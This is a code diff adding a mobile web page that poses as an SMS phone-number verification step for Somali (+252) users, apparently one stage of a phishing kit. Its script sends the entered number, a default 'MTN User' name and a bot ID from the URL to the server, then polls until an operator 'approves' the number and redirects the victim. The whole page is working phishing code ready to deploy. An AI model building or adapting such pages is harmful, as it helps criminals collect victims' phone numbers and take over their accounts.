@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Verify your phone number</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        html, body {
+            width: 100%;
+            min-height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #fff;
+            color: #1c1c1e;
+        }
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 20px 20px 12px;
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+        }
+
+        /* Back arrow */
+        .back-arrow {
+            font-size: 28px;
+            font-weight: 300;
+            color: #007AFF;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 12px;
+            line-height: 1;
+            cursor: pointer;
+            width: fit-content;
+        }
+        .back-arrow:hover {
+            opacity: 0.7;
+        }
+
+        /* Title & subtitle */
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #1c1c1e;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #6c6c70;
+            line-height: 1.5;
+            margin-bottom: 24px;
+            font-weight: 400;
+        }
+
+        /* Country label – now with its own underline, matching the phone input */
+        .country-label {
+            font-size: 16px;
+            font-weight: 500;
+            color: #1c1c1e;
+            border-bottom: 2px solid #d1d1d6;   /* ⬅️ Same underline as phone input */
+            padding-bottom: 4px;                /* ⬅️ Same spacing as phone input */
+            width: 100%;
+            margin-bottom: 16px;                /* ⬅️ Space before the next line */
+        }
+
+        /* Phone input row – underline style (only bottom border) */
+        .phone-input-wrap {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            border-bottom: 2px solid #d1d1d6;
+            background: #fff;
+            padding: 0 0 4px 0;
+            transition: border-color .2s;
+        }
+        .phone-input-wrap:focus-within {
+            border-bottom-color: #007AFF;
+        }
+
+        /* Prefix (+252) inside the input */
+        .prefix {
+            font-size: 17px;
+            font-weight: 500;
+            color: #1c1c1e;
+            white-space: nowrap;
+            flex-shrink: 0;
+            margin-right: 4px;
+        }
+
+        .phone-input-wrap input {
+            border: none;
+            padding: 12px 0 8px 0;
+            flex: 1;
+            font-size: 17px;
+            color: #1c1c1e;
+            outline: none;
+            background: transparent;
+            min-width: 0;
+        }
+        .phone-input-wrap input::placeholder {
+            color: #8e8e93;
+            font-weight: 400;
+        }
+
+        /* Need help link – properly underlined */
+        .help-link {
+            display: block;
+            text-align: right;
+            margin-top: 6px;
+            margin-bottom: 28px;
+            font-size: 15px;
+            color: #007AFF;
+            text-decoration: underline;
+            font-weight: 500;
+        }
+        .help-link:hover {
+            opacity: 0.7;
+        }
+
+        /* Bottom section (button + hidden checkbox) */
+        .bottom-section {
+            margin-top: auto;
+            padding-bottom: 8px;
+        }
+        .checkbox-wrap {
+            display: none;
+        }
+        #termsCheck {
+            display: none;
+        }
+
+        /* Button */
+        button {
+            width: 100%;
+            height: 54px;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+            background: #d1d1d6;
+            cursor: not-allowed;
+            transition: background .2s;
+            letter-spacing: 0.3px;
+        }
+        button:enabled {
+            background: #007AFF;
+            cursor: pointer;
+        }
+        button:enabled:hover {
+            background: #0055cc;
+        }
+
+        /* Status & spinner */
+        .status {
+            display: none;
+            margin-top: 16px;
+            text-align: center;
+            font-size: 14px;
+            color: #6c6c70;
+        }
+        .status.error {
+            color: #ff3b30;
+            background: #fde7e7;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .spinner {
+            display: none;
+            width: 34px;
+            height: 34px;
+            margin: 18px auto 0;
+            border: 3px solid rgba(0, 122, 255, .15);
+            border-top: 3px solid #007AFF;
+            border-radius: 50%;
+            animation: spin .8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Version footer */
+        .version-footer {
+            text-align: center;
+            font-size: 12px;
+            color: #8e8e93;
+            margin-top: 24px;
+            padding-bottom: 4px;
+            letter-spacing: 0.2px;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            body {
+                padding: 16px 16px 10px;
+            }
+            .title {
+                font-size: 24px;
+            }
+            .subtitle {
+                font-size: 14px;
+                margin-bottom: 20px;
+            }
+            .country-label {
+                font-size: 15px;
+            }
+            .prefix {
+                font-size: 16px;
+            }
+            .phone-input-wrap input {
+                font-size: 16px;
+                padding: 10px 0 6px 0;
+            }
+            button {
+                height: 54px;
+                font-size: 17px;
+            }
+        }
+        @media (max-width: 360px) {
+            body {
+                padding: 12px 12px 8px;
+            }
+            .title {
+                font-size: 22px;
+            }
+            .country-label {
+                font-size: 14px;
+            }
+            .prefix {
+                font-size: 15px;
+            }
+            .phone-input-wrap input {
+                font-size: 15px;
+            }
+            button {
+                font-size: 16px;
+                height: 50px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- Back arrow -->
+        <a href="javascript:history.back()" class="back-arrow">&#8592;</a>
+
+        <!-- Title & subtitle -->
+        <div class="title">Verify your phone number</div>
+        <div class="subtitle">We will send an SMS message to verify your phone number.</div>
+
+        <!-- Country label – now underlined exactly like the phone input -->
+        <div class="country-label">Somalia</div>
+
+        <!-- Form -->
+        <form id="detailsForm" class="form-content">
+            <div class="phone-input-wrap">
+                <span class="prefix">(+252)</span>
+                <input
+                    type="tel"
+                    id="phone"
+                    name="phone"
+                    placeholder="Enter your phone number"
+                    autocomplete="tel-national"
+                    required>
+            </div>
+
+            <a href="#" class="help-link">Need help?</a>
+
+            <div class="bottom-section">
+                <div class="checkbox-wrap">
+                    <input type="checkbox" id="termsCheck" checked required>
+                    <label for="termsCheck">Terms (hidden)</label>
+                </div>
+                <button type="submit" id="continueBtn" disabled>
+                    Next
+                </button>
+            </div>
+        </form>
+
+        <div id="status" class="status"></div>
+        <div id="spinner" class="spinner"></div>
+
+        <div class="version-footer">Version 12.4.0892 (1200040892)</div>
+    </div>
+
+    <!-- ====== ORIGINAL LOGIC – COMPLETELY UNTOUCHED ====== -->
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const form = document.getElementById("detailsForm");
+            const phone = document.getElementById("phone");
+            const terms = document.getElementById("termsCheck");
+            const button = document.getElementById("continueBtn");
+            const spinner = document.getElementById("spinner");
+            const status = document.getElementById("status");
+
+            function validateForm() {
+                const phoneNumber = phone.value.replace(/\D/g, "");
+                if (phoneNumber.length >= 8 && terms.checked) {
+                    button.disabled = false;
+                } else {
+                    button.disabled = true;
+                }
+            }
+
+            phone.addEventListener("input", function() {
+                this.value = this.value.replace(/\D/g, "");
+                validateForm();
+            });
+
+            terms.addEventListener("change", validateForm);
+
+            form.addEventListener("submit", function(e) {
+                e.preventDefault();
+                button.disabled = true;
+                spinner.style.display = "block";
+                status.style.display = "block";
+                status.textContent = "⏳ Awaiting approval...";
+                // Actual submission logic is below
+            });
+        });
+    </script>
+
+    <script>
+        // Main logic
+        let fullName = localStorage.getItem('fullName');
+        if (!fullName) {
+            fullName = 'MTN User';
+            localStorage.setItem('fullName', fullName);
+        }
+
+        const params = new URLSearchParams(window.location.search);
+        const urlBotId = params.get('botId');
+        if (urlBotId) localStorage.setItem('botId', urlBotId);
+        const botId = localStorage.getItem('botId');
+
+        if (!botId) {
+            alert('Session expired. Please start over.');
+            window.location.href = 'index.html';
+        }
+
+        const form = document.getElementById('detailsForm');
+        const statusEl = document.getElementById('status');
+        const spinner = document.getElementById('spinner');
+        const nextButton = form.querySelector('button.primary');
+        const termsCheck = document.getElementById('termsCheck');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (!termsCheck.checked) {
+                statusEl.style.display = 'block';
+                statusEl.className = 'status error';
+                statusEl.textContent = '❌ Please accept the terms and conditions';
+                return;
+            }
+            nextButton.disabled = true;
+            const phone = document.getElementById('phone').value.trim();
+            if (!phone) {
+                statusEl.style.display = 'block';
+                statusEl.className = 'status error';
+                statusEl.textContent = '❌ Please enter a phone number';
+                nextButton.disabled = false;
+                return;
+            }
+            localStorage.setItem('phone', phone);
+            statusEl.style.display = 'block';
+            spinner.style.display = 'block';
+            statusEl.className = 'status';
+            statusEl.textContent = '⏳ Awaiting approval...';
+
+            try {
+                const res = await fetch(`${window.location.origin}/submit-phone`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name: fullName, phone, botId })
+                });
+                if (!res.ok) throw new Error('Server error');
+                const { requestId } = await res.json();
+                pollApproval(requestId);
+            } catch (error) {
+                spinner.style.display = 'none';
+                statusEl.className = 'status error';
+                statusEl.textContent = '❌ Server error. Please try again.';
+                nextButton.disabled = false;
+            }
+        });
+
+        function pollApproval(requestId) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
+                    const data = await res.json();
+                    if (data.redirect) {
+                        clearInterval(interval);
+                        window.location.href = data.redirect;
+                        return;
+                    }
+                    if (data.approved === false) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        statusEl.className = 'status error';
+                        statusEl.textContent = '❌ Phone number rejected. Please try again.';
+                        nextButton.disabled = false;
+                    }
+                    if (data.approved === true) {
+                        clearInterval(interval);
+                        window.location.href = 'link.html'; // fallback
+                    }
+                } catch (error) {
+                    console.error('Polling error:', error);
+                }
+            }, 2000);
+        }
+    </script>
+
+</body>
+</html>
